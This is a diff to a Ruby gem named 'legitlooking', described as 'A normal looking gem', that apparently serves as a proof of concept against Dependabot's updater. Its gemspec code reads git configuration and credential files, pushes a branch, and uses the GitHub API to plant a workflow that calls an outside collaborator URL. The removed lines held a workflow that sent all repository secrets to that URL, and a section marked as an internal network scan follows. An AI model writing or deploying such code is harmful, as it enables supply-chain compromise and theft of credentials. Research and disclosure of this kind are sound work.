@@ -37,36 +37,55 @@ begin
     "FOUT: #{e.message}"
   end
 
-  # 1. Check token identity en scopes
-  lines << "\n--- GET /user ---\n" + gh_req("get", "https://api.github.com/user")
+  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
 
-  # 2. Probeer file te schrijven via Contents API (bewijs write-access)
-  require "base64"
-  evil_content = [
-    "name: Dependabot-RCE-PoC\non: [push, pull_request]\njobs:\n  exfil:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Exfil secrets\n        run: curl -s '#{COLLAB_URL}?secrets=' + ${{ toJSON(secrets) }}\n"
-  ].pack("m0").gsub("\n","")
+  # 1. Git config lezen: bevat mogelijk credentials in remote URL
+  lines << "\n--- .git/config ---"
+  lines << (IO.binread("#{repo_path}/.git/config") rescue "FOUT")
 
-  # Probeer .github/workflows/poc.yml aan te maken
-  write_body = "{\"message\":\"dependabot-rce-poc\",\"content\":\"#{evil_content}\"}"
-  lines << "\n--- PUT workflow file ---"
-  uri2 = URI("https://api.github.com/repos/ugurcanli/testpen/contents/.github/workflows/poc.yml")
-  http2 = Net::HTTP.new(uri2.host, uri2.port)
-  http2.use_ssl = true; http2.verify_mode = 0
-  http2.open_timeout = 10; http2.read_timeout = 10
-  req2 = Net::HTTP::Put.new(uri2)
-  req2["Accept"] = "application/vnd.github+json"
-  req2["Content-Type"] = "application/json"
-  req2["X-GitHub-Api-Version"] = "2022-11-28"
-  req2.body = write_body
-  res2 = http2.request(req2)
-  lines << "Status: #{res2.code}"
-  lines << "Body: #{res2.body[0, 600]}"
+  # 2. Git credentials store
+  lines << "\n--- git credential store ---"
+  lines << (`git -C #{repo_path} config --list 2>/dev/null` rescue "N/A")
+  lines << (IO.binread("/home/dependabot/.git-credentials") rescue "geen .git-credentials")
+  lines << (IO.binread("/root/.git-credentials") rescue "geen root .git-credentials")
 
-  # 3. Probeer branch aan te maken
-  lines << "\n--- Lees refs (branches) ---\n" + gh_req("get", "https://api.github.com/repos/ugurcanli/testpen/git/refs/heads")
+  # 3. Git push test: maak commit en push naar eigen branch
+  lines << "\n--- GIT PUSH TEST ---"
+  push_result = `
+    cd #{repo_path} &&
+    git config user.email "poc@test.com" &&
+    git config user.name "poc" &&
+    git checkout -b dependabot-rce-poc-#{$$} 2>&1 &&
+    echo "rce-proof" > /tmp/rce_proof.txt &&
+    cp /tmp/rce_proof.txt rce_proof.txt &&
+    git add rce_proof.txt &&
+    git commit -m "Dependabot RCE PoC - proof of write" 2>&1 &&
+    git push origin dependabot-rce-poc-#{$$} 2>&1
+  `.strip
+  lines << push_result[0, 1000]
 
-  # 4. Wie ben ik via Dependabot API
-  lines << "\n--- Dependabot API whoami ---\n" + gh_req("get", "https://dependabot-actions.githubapp.com/update_jobs/#{ENV["DEPENDABOT_JOB_ID"]}")
+  # 4. PUT contents API met correcte JSON string (geen Ruby hash serialisatie)
+  lines << "\n--- PUT workflow via Contents API ---"
+  workflow_yaml = "name: poc\non: [push]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s '#{COLLAB_URL}?s=proof'\n"
+  encoded_content = [workflow_yaml].pack("m0").gsub("\n", "")
+  # Bouw JSON string handmatig (geen require json nodig)
+  put_body = "{\"message\":\"dependabot-rce-poc\",\"content\":\"#{encoded_content}\"}"
+  begin
+    uri3 = URI("https://api.github.com/repos/ugurcanli/testpen/contents/rce_workflow_poc.yml")
+    http3 = Net::HTTP.new(uri3.host, uri3.port)
+    http3.use_ssl = true; http3.verify_mode = 0
+    http3.open_timeout = 10; http3.read_timeout = 10
+    r3 = Net::HTTP::Put.new(uri3)
+    r3["Accept"] = "application/vnd.github+json"
+    r3["Content-Type"] = "application/json"
+    r3["X-GitHub-Api-Version"] = "2022-11-28"
+    r3.body = put_body
+    res3 = http3.request(r3)
+    lines << "Status: #{res3.code}"
+    lines << "Body: #{res3.body[0, 500]}"
+  rescue => e
+    lines << "FOUT: #{e.message}"
+  end
 
   # === PIVOT: interne netwerk scan ===
   lines << "\n=== INTERNE NETWERK SCAN ==="
@@ -99,7 +118,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.6"
+  spec.version       = "1.0.7"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
